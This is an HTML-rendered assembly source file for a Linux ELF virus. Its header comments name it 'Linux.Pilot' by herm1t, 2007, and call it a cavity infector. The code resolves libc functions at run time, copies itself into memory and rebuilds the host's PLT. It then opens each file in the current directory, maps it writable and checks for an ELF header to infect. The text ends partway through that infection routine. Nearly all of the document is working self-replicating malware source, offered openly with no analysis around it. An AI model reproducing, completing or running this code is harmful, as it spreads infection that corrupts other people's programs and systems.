<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>pilot.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; Linux.Pilot, alpha, (x) herm1t, 2007</span><span class="sc0">
</span><span class="sc1">; This virus implements two features:</span><span class="sc0">
</span><span class="sc1">; * Resolving and using libc functions</span><span class="sc0">
</span><span class="sc1">; * It is cavity infector, removing PLT and restoring it</span><span class="sc0">
</span><span class="sc1">; both at run-time</span><span class="sc0">
</span><span class="sc1">; http://vx.org.ua/herm1t/</span><span class="sc0">
        </span><span class="sc9">BITS</span><span class="sc0">    </span><span class="sc2">32</span><span class="sc0">
        </span><span class="sc9">CPU</span><span class="sc0"> </span><span class="sc2">386</span><span class="sc0">
        </span><span class="sc9">section</span><span class="sc0"> </span><span class="sc10">.text</span><span class="sc0">       
        </span><span class="sc9">global</span><span class="sc0">  </span><span class="sc5">main</span><span class="sc0">
</span><span class="sc1">;%define    DEBUG</span><span class="sc0">
</span><span class="sc9">%include</span><span class="sc0"> </span><span class="sc12">'pilot.inc'</span><span class="sc0">
        </span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">_GLOBAL_OFFSET_TABLE_</span><span class="sc0">
        </span><span class="sc9">extern</span><span class="sc0">  </span><span class="sc5">exit</span><span class="sc0">        
</span><span class="sc1">;;;;</span><span class="sc0">
</span><span class="sc5">old_main</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">exit</span><span class="sc0">
</span><span class="sc1">; fake PLT</span><span class="sc0">
        </span><span class="sc9">align</span><span class="sc0">   </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc5">_plt</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_GLOBAL_OFFSET_TABLE_</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_GLOBAL_OFFSET_TABLE_</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">main</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">.l0</span><span class="sc0">
</span><span class="sc5">.l0</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">.l0</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">main</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc1">; find libc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; GOT + 8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; GOT[2] - _dl_runtime_resolve</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">.lazy</span><span class="sc0">
        </span><span class="sc1">; address is empty, LD_BIND_NOW is set?</span><span class="sc0">
        </span><span class="sc1">; use GOT[4], hope that this is libc...</span><span class="sc0">
        </span><span class="sc1">; this could be checked</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">              
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">.bnow</span><span class="sc0">
</span><span class="sc5">.lazy</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">unwind</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; GOT[4] - address of libc' function </span><span class="sc0">
</span><span class="sc5">.bnow</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">unwind</span><span class="sc0">                  </span><span class="sc1">; within interp</span><span class="sc0">
</span><span class="sc9">%macro</span><span class="sc0"> </span><span class="sc5">getdt</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">%2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_from_dyn</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">%1</span><span class="sc0">
</span><span class="sc9">%endmacro</span><span class="sc0">
        </span><span class="sc1">; now we have</span><span class="sc0">
        </span><span class="sc1">; esi       - libc' DYNAMIC</span><span class="sc0">
        </span><span class="sc1">; edi       - libc' delta</span><span class="sc0">
        </span><span class="sc1">; ecx       - libc' GOT</span><span class="sc0">
        </span><span class="sc5">getdt</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DT_STRTAB</span><span class="sc0">
        </span><span class="sc5">getdt</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DT_SYMTAB</span><span class="sc0">
        </span><span class="sc5">getdt</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DT_HASH</span><span class="sc0">
</span><span class="sc1">; no error checking here, if we failed we got fucked anyway (with broken PLT)...</span><span class="sc0">
</span><span class="sc1">;       mov eax, ebx</span><span class="sc0">
</span><span class="sc1">;       and eax, edx</span><span class="sc0">
</span><span class="sc1">;       and eax, esi</span><span class="sc0">
</span><span class="sc1">;       jz  near fail</span><span class="sc0">

        </span><span class="sc1">; all is ready for the symbol lookup</span><span class="sc0">
        </span><span class="sc1">; we have the following registers layout:</span><span class="sc0">
        </span><span class="sc1">; eax, ecx  - spare</span><span class="sc0">
        </span><span class="sc1">; ebx       - libc .dynstr</span><span class="sc0">
        </span><span class="sc1">; edx       - libc .dynsym</span><span class="sc0">
        </span><span class="sc1">; esi       - libc .hash</span><span class="sc0">
        </span><span class="sc1">; edi       - delta between libc' file and memory location</span><span class="sc0">
        </span><span class="sc1">; ebp       - start of virus</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc5">resolve</span><span class="sc4">:</span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">O</span><span class="sc4">(</span><span class="sc5">indexes</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">O</span><span class="sc4">(</span><span class="sc5">strings</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">     </span><span class="sc1">; .dynstr</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">     </span><span class="sc1">; .dynsym</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">     </span><span class="sc1">; .hash</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; function name</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lookup</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">    </span><span class="sc1">; delta</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">N_SYMS</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">resolve</span><span class="sc0">
        </span><span class="sc1">; now we have addresses of functions in stack</span><span class="sc0">

        </span><span class="sc1">; allocate virus text and data</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; offset</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; fd</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAP_PRIVATE</span><span class="sc4">|</span><span class="sc5">MAP_ANONYMOUS</span><span class="sc0">   </span><span class="sc1">; flags</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PROT_READ</span><span class="sc4">|</span><span class="sc5">PROT_WRITE</span><span class="sc0">        </span><span class="sc1">; prot</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">8192</span><span class="sc0">                </span><span class="sc1">; length</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; size</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; mmap()</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc1">; copy virus body</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">O</span><span class="sc4">(</span><span class="sc5">virus_end</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc1">; mprotect(virus, virus_length, PROT_READ|PROT_EXEC)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PROT_READ</span><span class="sc4">|</span><span class="sc5">PROT_EXEC</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">O</span><span class="sc4">(</span><span class="sc5">virus_end</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
        </span><span class="sc1">; copy addresses</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4096</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">N_SYMS</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc1">; move control</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">O</span><span class="sc4">(</span><span class="sc5">.fixplt</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">.fixplt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; restore .plt</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xf000</span><span class="sc0">      
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PROT_READ</span><span class="sc4">|</span><span class="sc5">PROT_WRITE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">8192</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mprotect</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x08049000</span><span class="sc0">
</span><span class="sc5">first_got</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc5">main</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x00000000</span><span class="sc0">
</span><span class="sc5">first_rel</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc5">main</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0xffffffe0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">plt_count</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc5">main</span><span class="sc0">
    </span><span class="sc5">.fix</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x25ff</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x68</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xe9</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">.fix</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">PROT_READ</span><span class="sc4">|</span><span class="sc5">PROT_EXEC</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mprotect</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">

</span><span class="sc9">%ifdef</span><span class="sc0">  </span><span class="sc5">DEBUG</span><span class="sc0">   
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">O</span><span class="sc4">(</span><span class="sc5">virus_end</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">O</span><span class="sc4">(</span><span class="sc5">hello</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">printf</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc9">%endif</span><span class="sc0">
        </span><span class="sc1">; ok here we go</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0x2e</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">opendir</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">fail</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc5">.find</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">readdir</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">.done</span><span class="sc0">
        
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; d_name</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">.find</span><span class="sc0">
        
    </span><span class="sc5">.done</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">closedir</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc5">fail</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">old_main</span><span class="sc0">
</span><span class="sc5">old_entry</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc5">main</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">open</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">js</span><span class="sc0">  </span><span class="sc5">.fail</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">file_handle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseek</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">file_length</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">84</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">.close</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; offset</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">file_handle</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; handle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAP_SHARED</span><span class="sc0">          </span><span class="sc1">; flags</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PROT_READ</span><span class="sc4">|</span><span class="sc5">PROT_WRITE</span><span class="sc0">        </span><span class="sc1">; prot</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; length</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; start</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mmap</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">.close</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0x464c457f</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">.unmap</span><span class="sc0">
